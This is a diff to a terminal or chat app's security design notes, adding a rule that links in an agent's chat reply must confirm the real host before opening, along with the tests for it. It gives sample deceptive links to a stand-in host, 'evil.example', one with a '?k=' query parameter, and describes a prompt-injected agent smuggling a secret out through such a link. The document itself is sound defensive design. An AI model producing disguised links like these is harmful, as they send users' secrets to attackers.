@@ -86,6 +86,10 @@ never do.
   (`.mobileconfig`, `.jnlp`, `.prefPane`, `.workflow`), HTML and XML, and typed directories.
   Symlinks are resolved first.
 - Remote panes open paths in the editor, never with Launch Services.
+- Chat applies the same rule to links in an agent's reply, with the link's label as what was
+  seen: `[the fix](https://evil.example/?k=…)` or a `github.com@evil.example` link asks first
+  and names the real host. A prompt-injected agent cannot turn a tap into a request that
+  carries a secret.
 
 **Paste.** Every path goes through libghostty-vt's paste encoder: keyboard, menu, key bar,
 dictation, workflows, the daemon's paste RPC, the composer, and MCP `pane_send`/`cmd_run`. The
@@ -254,6 +258,8 @@ with the fix removed or weakened, its test fails.
     Leading whitespace, zero-width and control prefixes and percent-encoded schemes fail to
     parse and are refused.
   - Labels: `LinkTests.hyperlinkLabelIsItsCells`, `LinkLabelTests.hiddenCellsAreNotPartOfWhatWasSeen`.
+  - Chat: `ChatLinksTests` (a label over another address, a `user@` host, the same address
+    shown and hidden in one block).
   - Local files: `filesThatInstallOrRunWebContentAreNotOpened` (about 30 names, with
     symlinks, case and trailing-dot variants) and
     `localFilesThatWouldRunAreNotOpened`.
